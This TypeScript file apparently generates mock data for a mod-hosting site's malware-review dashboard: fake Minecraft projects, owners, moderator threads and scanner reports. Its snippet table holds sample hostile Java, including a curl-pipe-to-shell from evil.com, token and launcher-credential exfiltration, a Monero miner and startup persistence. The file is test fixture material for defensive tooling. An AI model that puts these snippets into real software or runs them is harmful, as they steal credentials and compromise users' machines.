import type { Labrinth } from '@modrinth/api-client'

type SearchResponse = Labrinth.TechReview.Internal.SearchResponse
type FileReport = Labrinth.TechReview.Internal.FileReport
type FileIssue = Labrinth.TechReview.Internal.FileIssue
type ReportIssueDetail = Labrinth.TechReview.Internal.ReportIssueDetail
type DelphiSeverity = Labrinth.TechReview.Internal.DelphiSeverity
type DelphiReportIssueStatus = Labrinth.TechReview.Internal.DelphiReportIssueStatus
type Ownership = Labrinth.TechReview.Internal.Ownership
type DBThread = Labrinth.TechReview.Internal.DBThread
type DBThreadMessage = Labrinth.TechReview.Internal.DBThreadMessage
type Project = Labrinth.Projects.v3.Project
type ProjectStatus = Labrinth.Projects.v2.ProjectStatus
type ProjectType = Labrinth.Projects.v2.ProjectType

// Realistic issue types for Minecraft mods
const ISSUE_TYPES = [
	'obfuscated_code',
	'suspicious_network_activity',
	'runtime_exec_usage',
	'credential_access',
	'file_system_write',
	'reflection_abuse',
	'native_code_loading',
	'data_exfiltration',
	'telemetry_without_consent',
	'cryptominer_detected',
	'malicious_payload',
	'unsafe_deserialization',
	'command_injection_risk',
	'path_traversal_risk',
	'arbitrary_code_execution',
] as const

// Realistic mod names
const MOD_NAMES = [
	'OptiFine',
	'Just Enough Items',
	'Biomes O Plenty',
	'Create Mechanical Plus',
	'Farmer Delight Extended',
	'Tech Reborn Addon',
	'Mystical Agriculture Enhanced',
	'Iron Chests Expanded',
	'Applied Energistics Addon',
	'Thermal Expansion Plus',
	'Mekanism Extra Generators',
	'Botania Garden of Glass',
	'Industrial Foregoing Addon',
	'Refined Storage Addons',
	'Ender IO Conduits',
	'Actually Additions Extra',
	'Extra Utilities Reborn',
	'Blood Magic Ritual Expansion',
	'Astral Sorcery Extended',
	'Thaumcraft Research Helper',
	'Twilight Forest Expansion',
	'Tinkers Construct Materials',
	'ProjectE Extended EMC',
	'Draconic Evolution Reactor',
	'Environmental Tech Generators',
	'Immersive Engineering Wires',
	'Buildcraft Transport Addon',
	'Forestry Bee Genetics',
	'Railcraft Track Extensions',
	'Chisel and Bits Extended',
]

// Realistic usernames and organization names
const USERNAMES = [
	'modder123',
	'CraftingMaster',
	'MinecraftDev',
	'PixelPioneer',
	'CodeSmith',
	'BlockBuilder',
	'RedstoneGuru',
	'EnchantedDev',
	'CreeperCoder',
	'DiamondDigger',
	'EnderEngineer',
	'NetherNavigator',
	'PortalProgrammer',
	'SlimeCoder',
	'VillagerVanguard',
]

const ORG_NAMES = [
	'Minecraft Mod Collective',
	'Tech Mods United',
	'Magic & Tech Studios',
	'Redstone Innovations',
	'Block Crafters Guild',
	'Automation Engineers',
	'Creative Builders Inc',
	'Dimension Developers',
]

const PROJECT_TYPES: ProjectType[] = [
	'mod',
	'modpack',
	'resourcepack',
	'shader',
	'plugin',
	'datapack',
]

// Code snippets for different issue types
const CODE_SNIPPETS: Record<string, string[]> = {
	obfuscated_code: [
		`public class a {
    private String b = "aHR0cDovL2V2aWwuY29t";

    public void c() {
        String d = new String(Base64.decode(this.b));
        // Heavily obfuscated logic
        for(int i = 0; i < d.length(); i++) {
            d = d.substring(1) + d.charAt(0);
        }
    }
}`,
		`public class ObfuscatedClass {
    private static final String[] z = new String[100];

    static {
        // String deobfuscation at runtime
        z[0] = "\\u0068\\u0074\\u0074\\u0070";
        z[1] = new String(new byte[]{104, 116, 116, 112, 115});
    }
}`,
	],
	suspicious_network_activity: [
		`public void sendData() {
    URL url = new URL("http://suspicious-domain.xyz/collect");
    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
    conn.setRequestMethod("POST");
    conn.setDoOutput(true);

    String data = "uuid=" + Minecraft.getMinecraft().getSession().getProfile().getId();
    data += "&username=" + Minecraft.getMinecraft().getSession().getUsername();

    OutputStream os = conn.getOutputStream();
    os.write(data.getBytes());
}`,
		`private void phoneHome() {
    Socket socket = new Socket("192.168.1.100", 4444);
    OutputStream out = socket.getOutputStream();
    out.write(System.getProperty("user.name").getBytes());
    out.write(System.getProperty("user.home").getBytes());
}`,
	],
	runtime_exec_usage: [
		`public void executeCommand() {
    Runtime runtime = Runtime.getRuntime();
    String[] cmd = {"/bin/sh", "-c", "curl http://evil.com/payload.sh | sh"};
    Process process = runtime.exec(cmd);
}`,
		`private void runSystemCommand() {
    ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "net user");
    pb.start();
}`,
	],
	credential_access: [
		`public void stealCredentials() {
    File minecraftDir = new File(System.getProperty("user.home"), ".minecraft");
    File authFile = new File(minecraftDir, "launcher_accounts.json");

    if (authFile.exists()) {
        String content = FileUtils.readFileToString(authFile);
        sendToServer(content);
    }
}`,
		`private void harvestTokens() {
    String home = System.getProperty("user.home");
    File[] tokenFiles = new File[] {
        new File(home, ".minecraft/auth.json"),
        new File(home, "AppData/Roaming/.minecraft/launcher_profiles.json")
    };
}`,
	],
	file_system_write: [
		`public void modifySystemFiles() {
    File systemDir = new File("C:\\\\Windows\\\\System32");
    File targetFile = new File(systemDir, "malicious.dll");

    FileOutputStream fos = new FileOutputStream(targetFile);
    fos.write(payloadBytes);
}`,
		`private void writeToStartup() {
    String startup = System.getenv("APPDATA") + "\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup";
    File file = new File(startup, "updater.exe");
    Files.copy(maliciousPayload, file.toPath());
}`,
	],
	reflection_abuse: [
		`public void bypassSecurityManager() {
    Class<?> systemClass = Class.forName("java.lang.System");
    Field securityField = systemClass.getDeclaredField("security");
    securityField.setAccessible(true);
    securityField.set(null, null); // Disable security manager
}`,
		`private void accessPrivateMethod() throws Exception {
    Class<?> clazz = Class.forName("net.minecraft.client.Minecraft");
    Method method = clazz.getDeclaredMethod("shutdown");
    method.setAccessible(true);
    method.invoke(null);
}`,
	],
	native_code_loading: [
		`public void loadNativeLibrary() {
    try {
        System.load("/tmp/malicious.so");
    } catch (Exception e) {
        System.loadLibrary("malicious");
    }
}`,
		`static {
    File tempLib = File.createTempFile("native", ".dll");
    extractResource("/assets/evil.dll", tempLib);
    System.load(tempLib.getAbsolutePath());
}`,
	],
	data_exfiltration: [
		`public void exfiltrateData() {
    Map<String, String> data = new HashMap<>();
    data.put("ip", getPublicIP());
    data.put("hwid", getHardwareId());
    data.put("mods", getInstalledMods().toString());
    data.put("discord_token", getDiscordToken());

    sendEncrypted("https://collector.evil.com/api/collect", data);
}`,
		`private void uploadWorldData() {
    File worldsDir = new File(Minecraft.getMinecraft().mcDataDir, "saves");
    zipDirectory(worldsDir);
    uploadToServer("https://data-theft.com/upload");
}`,
	],
	telemetry_without_consent: [
		`@EventHandler
public void onPlayerJoin(PlayerJoinEvent event) {
    JSONObject telemetry = new JSONObject();
    telemetry.put("player", event.getPlayer().getUniqueId());
    telemetry.put("ip", event.getPlayer().getAddress().getHostString());
    telemetry.put("version", Bukkit.getVersion());

    // No consent, no opt-out
    sendAnalytics(telemetry);
}`,
		`public void trackEverything() {
    Timer timer = new Timer();
    timer.scheduleAtFixedRate(new TimerTask() {
        public void run() {
            reportUsageStats(); // Sends without user knowledge
        }
    }, 0, 300000); // Every 5 minutes
}`,
	],
	cryptominer_detected: [
		`public class MiningThread extends Thread {
    private static final String POOL = "pool.minexmr.com:4444";
    private static final String WALLET = "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A";

    public void run() {
        while (true) {
            mineMonero(POOL, WALLET);
        }
    }
}`,
		`static {
    // CPU-intensive hashing (crypto mining)
    for (int i = 0; i < Runtime.getRuntime().availableProcessors(); i++) {
        new Thread(() -> {
            while (true) {
                computeHash();
            }
        }).start();
    }
}`,
	],
	malicious_payload: [
		`public void deployRansomware() {
    File[] drives = File.listRoots();
    for (File drive : drives) {
        encryptAllFiles(drive);
    }
    showRansomNote();
}`,
		`private void installBackdoor() {
    downloadAndExecute("https://attacker.com/backdoor.exe");
    addToPersistence();
    disableAntivirus();
}`,
	],
	unsafe_deserialization: [
		`public Object deserializeUntrusted(byte[] data) {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
    // No validation - arbitrary code execution risk
    return ois.readObject();
}`,
		`private void loadConfig() {
    File configFile = new File("config.ser");
    ObjectInputStream in = new ObjectInputStream(new FileInputStream(configFile));
    this.config = in.readObject(); // Dangerous
}`,
	],
	command_injection_risk: [
		`public void processUserInput(String username) {
    String command = "echo " + username + " > users.txt";
    Runtime.getRuntime().exec(command); // No sanitization
}`,
		`private void generateReport(String filename) {
    ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", "cat " + filename);
    pb.start(); // Vulnerable to injection
}`,
	],
	path_traversal_risk: [
		`public File getUserFile(String filename) {
    // No path validation - can access ../../../etc/passwd
    return new File("/var/app/data/" + filename);
}`,
		`private void loadResource(String path) {
    File file = new File(baseDir, path); // path could be ../../sensitive
    return FileUtils.readFileToString(file);
}`,
	],
	arbitrary_code_execution: [
		`public void evaluateCode(String code) {
    ScriptEngineManager manager = new ScriptEngineManager();
    ScriptEngine engine = manager.getEngineByName("JavaScript");
    engine.eval(code); // Execute arbitrary code from user input
}`,
		`private void loadPlugin(String className) {
    Class<?> clazz = Class.forName(className);
    clazz.newInstance(); // Instantiate arbitrary classes
}`,
	],
}

// Helper functions
function randomElement<T>(array: T[]): T {
	return array[Math.floor(Math.random() * array.length)]
}

// function randomElements<T>(array: T[], count: number): T[] {
// 	const shuffled = [...array].sort(() => Math.random() - 0.5)
// 	return shuffled.slice(0, Math.min(count, array.length))
// }

function randomInt(min: number, max: number): number {
	return Math.floor(Math.random() * (max - min + 1)) + min
}

function randomDate(daysAgo: number): string {
	const date = new Date()
	date.setDate(date.getDate() - randomInt(0, daysAgo))
	date.setHours(randomInt(0, 23))
	date.setMinutes(randomInt(0, 59))
	date.setSeconds(randomInt(0, 59))
	return date.toISOString()
}

function weightedRandom<T>(items: T[], weights: number[]): T {
	const totalWeight = weights.reduce((sum, w) => sum + w, 0)
	let random = Math.random() * totalWeight

	for (let i = 0; i < items.length; i++) {
		random -= weights[i]
		if (random <= 0) {
			return items[i]
		}
	}

	return items[items.length - 1]
}

function generateSlug(name: string): string {
	return name
		.toLowerCase()
		.replace(/[^a-z0-9]+/g, '-')
		.replace(/^-|-$/g, '')
}

function generateReportIssueDetail(
	issueType: string,
	severity: DelphiSeverity,
	issueId: string,
): ReportIssueDetail {
	const snippets = CODE_SNIPPETS[issueType] || CODE_SNIPPETS.obfuscated_code
	const snippet = randomElement(snippets)

	const filePaths: Record<string, string[]> = {
		obfuscated_code: [
			'com/obfuscated/a.class',
			'org/unknown/b.class',
			'net/evil/ObfuscatedClass.class',
			'l.class',
			'ClassLoader.class',
		],
		suspicious_network_activity: [
			'com/mod/network/NetworkHandler.class',
			'com/mod/telemetry/DataCollector.class',
			'com/mod/client/TelemetryClient.class',
			'com/mod/update/UpdateChecker.class',
		],
		runtime_exec_usage: [
			'com/mod/system/CommandExecutor.class',
			'com/mod/util/SystemHelper.class',
			'com/mod/process/ProcessManager.class',
		],
		credential_access: [
			'com/evil/stealer/AuthStealer.class',
			'com/malware/CredentialHarvester.class',
			'com/mod/session/SessionManager.class',
		],
		file_system_write: [
			'com/mod/io/FileManager.class',
			'com/mod/system/SystemWriter.class',
			'com/malware/PersistenceHelper.class',
		],
		reflection_abuse: [
			'com/mod/util/ReflectionUtils.class',
			'com/evil/SecurityBypass.class',
			'com/mod/access/AccessHelper.class',
		],
		native_code_loading: [
			'com/mod/native/NativeLoader.class',
			'com/mod/lib/LibraryManager.class',
			'com/mod/jni/JNIHelper.class',
		],
		data_exfiltration: [
			'com/evil/DataUploader.class',
			'com/mod/analytics/AnalyticsClient.class',
			'com/mod/stats/StatsCollector.class',
		],
		telemetry_without_consent: [
			'com/mod/telemetry/TelemetryService.class',
			'com/mod/tracking/UsageTracker.class',
			'com/mod/metrics/MetricsCollector.class',
		],
		cryptominer_detected: [
			'com/evil/mining/MiningThread.class',
			'com/malware/crypto/HashComputer.class',
			'com/evil/pool/PoolConnector.class',
		],
		malicious_payload: [
			'com/evil/PayloadDeployer.class',
			'com/malware/Ransomware.class',
			'com/evil/backdoor/BackdoorInstaller.class',
		],
		unsafe_deserialization: [
			'com/mod/config/ConfigLoader.class',
			'com/mod/data/DataDeserializer.class',
			'com/mod/io/ObjectReader.class',
		],
		command_injection_risk: [
			'com/mod/cmd/CommandProcessor.class',
			'com/mod/shell/ShellExecutor.class',
			'com/mod/system/SystemCommand.class',
		],
		path_traversal_risk: [
			'com/mod/file/FileAccessor.class',
			'com/mod/resource/ResourceLoader.class',
			'com/mod/path/PathResolver.class',
		],
		arbitrary_code_execution: [
			'com/mod/script/ScriptEvaluator.class',
			'com/mod/plugin/PluginLoader.class',
			'com/mod/eval/CodeExecutor.class',
		],
	}

	const filePath = randomElement(filePaths[issueType] || ['com/unknown/UnknownClass.class'])
	const className = filePath.split('/').pop()?.replace('.class', '') || 'UnknownClass'

	// Sometimes omit decompiled source (for performance/size reasons)
	const includeSource = Math.random() > 0.15 // 85% include source

	return {
		id: `detail_${Math.random().toString(36).slice(2, 11)}`,
		issue_id: issueId,
		key: className,
		file_path: filePath,
		decompiled_source: includeSource ? snippet : null,
		data: {
			// Additional metadata
			line_count: includeSource ? snippet.split('\n').length : 0,
			bytecode_size: randomInt(100, 5000),
			detection_confidence: Math.random() * 100,
		},
		severity,
	}
}

function generateFileIssue(
	issueType: string,
	status: DelphiReportIssueStatus,
	reportId: string,
): FileIssue {
	const severities: DelphiSeverity[] = ['LOW', 'MEDIUM', 'HIGH', 'SEVERE']
	const weights = [10, 30, 40, 20] // More medium/high issues
	const severity = weightedRandom(severities, weights)

	const issueId = `issue_${Math.random().toString(36).slice(2, 11)}`
	const detailCount = randomInt(1, 2)
	const details: ReportIssueDetail[] = []

	for (let i = 0; i < detailCount; i++) {
		details.push(generateReportIssueDetail(issueType, severity, issueId))
	}

	return {
		id: issueId,
		report_id: reportId,
		issue_type: issueType,
		status,
		details,
	}
}

function generateFileReport(projectId: string, versionId: string, daysAgo: number): FileReport {
	const fileExtensions = ['.jar', '.class', '.zip']
	const fileNames = [
		'core',
		'common',
		'client',
		'server',
		'api',
		'utils',
		'helpers',
		'managers',
		'handlers',
		'network',
		'entities',
		'blocks',
		'items',
		'integration',
	]

	const fileName = randomElement(fileNames) + randomElement(fileExtensions)
	const fileSize = randomInt(1024, 10 * 1024 * 1024) // 1 KB to 10 MB

	const reportId = `report_${Math.random().toString(36).slice(2, 11)}`
	const fileId = `file_${Math.random().toString(36).slice(2, 11)}`

	const issueCount = randomInt(1, 3)
	const issues: FileIssue[] = []

	const statuses: DelphiReportIssueStatus[] = ['pending', 'safe', 'unsafe']
	const statusWeights = [50, 35, 15] // More pending issues

	for (let i = 0; i < issueCount; i++) {
		const issueType = randomElement([...ISSUE_TYPES])
		const status = weightedRandom(statuses, statusWeights)
		issues.push(generateFileIssue(issueType, status, reportId))
	}

	// Calculate overall severity from all issues
	const allSeverities = issues.flatMap((i) => i.details).map((d) => d.severity)

	const severityOrder: Record<DelphiSeverity, number> = { LOW: 0, MEDIUM: 1, HIGH: 2, SEVERE: 3 }
	const maxSeverity = allSeverities.reduce<DelphiSeverity>(
		(max, sev) => (severityOrder[sev] > severityOrder[max] ? sev : max),
		'LOW',
	)

	return {
		id: reportId,
		file_id: fileId,
		version_id: versionId,
		project_id: projectId,
		created: randomDate(daysAgo),
		flag_reason: 'delphi',
		severity: maxSeverity,
		file_name: fileName,
		file_size: fileSize,
		issues,
	}
}

function generateOwnership(): Ownership {
	const isOrg = Math.random() < 0.3 // 30% organizations

	if (isOrg) {
		const name = randomElement(ORG_NAMES)
		return {
			kind: 'organization',
			id: `org_${Math.random().toString(36).slice(2, 11)}`,
			name,
			icon_url: `https://api.dicebear.com/7.x/initials/svg?seed=${encodeURIComponent(name)}`,
		}
	} else {
		const name = randomElement(USERNAMES)
		return {
			kind: 'user',
			id: `user_${Math.random().toString(36).slice(2, 11)}`,
			name,
			icon_url: `https://api.dicebear.com/7.x/avataaars/svg?seed=${encodeURIComponent(name)}`,
		}
	}
}

function generateThreadMessages(projectId: string, threadId: string): DBThreadMessage[] {
	const messages: DBThreadMessage[] = []

	// Initial status change message
	messages.push({
		id: `msg_${Math.random().toString(36).slice(2, 11)}`,
		thread_id: threadId,
		author_id: undefined,
		body: {
			type: 'status_change',
			old_status: 'approved',
			new_status: 'processing',
		},
		created: randomDate(30),
		hide_identity: false,
	})

	// Random human comments
	const commentCount = randomInt(1, 4)
	const comments = [
		'Reviewing the security scan results. Some concerning patterns detected.',
		'The obfuscation level is quite high. Requires manual inspection.',
		'Network activity looks suspicious. Investigating further.',
		'Decompiled code shows potential credential access. Flagging for review.',
		'This appears to be a false positive. Marking as safe.',
		'Confirmed malicious payload. Taking down immediately.',
		'Author has been contacted for clarification.',
		'Updated scan completed. New issues detected.',
	]

	for (let i = 0; i < commentCount; i++) {
		messages.push({
			id: `msg_${Math.random().toString(36).slice(2, 11)}`,
			thread_id: threadId,
			author_id: `user_mod_${randomInt(1, 5)}`,
			body: {
				type: 'text',
				body: randomElement(comments),
				private: Math.random() < 0.3,
			},
			created: randomDate(25),
			hide_identity: false,
		})
	}

	return messages
}

function generateThread(projectId: string): DBThread {
	const threadId = `thread_${Math.random().toString(36).slice(2, 11)}`

	return {
		id: threadId,
		project_id: projectId,
		type_: 'project',
		messages: generateThreadMessages(projectId, threadId),
		members: [`user_mod_${randomInt(1, 5)}`],
	}
}

function generateProject(): Project {
	const projectId = `proj_${Math.random().toString(36).slice(2, 11)}`
	const name = randomElement(MOD_NAMES)
	const slug = generateSlug(name)
	const projectType = randomElement(PROJECT_TYPES)

	return {
		id: projectId,
		slug,
		project_types: [projectType],
		games: ['minecraft'],
		team_id: `team_${Math.random().toString(36).slice(2, 11)}`,
		name,
		summary: `An awesome ${projectType} that enhances your Minecraft experience`,
		description: `# ${name}\n\nThis is a detailed description of the ${projectType}.`,
		published: randomDate(180),
		updated: randomDate(30),
		status: 'processing' as ProjectStatus,
		license: {
			id: 'MIT',
			name: 'MIT License',
			url: 'https://opensource.org/licenses/MIT',
		},
		downloads: randomInt(1000, 1000000),
		followers: randomInt(100, 50000),
		categories: ['technology', 'utility'],
		additional_categories: [],
		loaders: ['forge', 'fabric'],
		versions: [`${randomInt(1, 20)}.${randomInt(0, 4)}.${randomInt(0, 10)}`],
		icon_url: `https://api.dicebear.com/7.x/shapes/svg?seed=${encodeURIComponent(name)}`,
		link_urls: {},
		gallery: [],
		color: randomInt(0, 16777215),
		thread_id: `thread_${Math.random().toString(36).slice(2, 11)}`,
		monetization_status: 'monetized',
		side_types_migration_review_status: 'reviewed',
	}
}

export function generateMockSearchResponse(projectCount: number): SearchResponse {
	const reports: FileReport[] = []
	const projects: Record<string, Project> = {}
	const threads: Record<string, DBThread> = {}
	const ownership: Record<string, Ownership> = {}

	for (let i = 0; i < projectCount; i++) {
		const project = generateProject()
		const owner = generateOwnership()
		const thread = generateThread(project.id)

		// Store in lookup maps
		projects[project.id] = project
		threads[thread.id] = thread
		ownership[project.id] = owner

		// Generate 1-3 file reports per project
		const reportCount = randomInt(1, 3)

		for (let j = 0; j < reportCount; j++) {
			const versionId = `version_${Math.random().toString(36).slice(2, 11)}`
			reports.push(generateFileReport(project.id, versionId, 60))
		}
	}

	return {
		reports,
		projects,
		threads,
		ownership,
	}
}
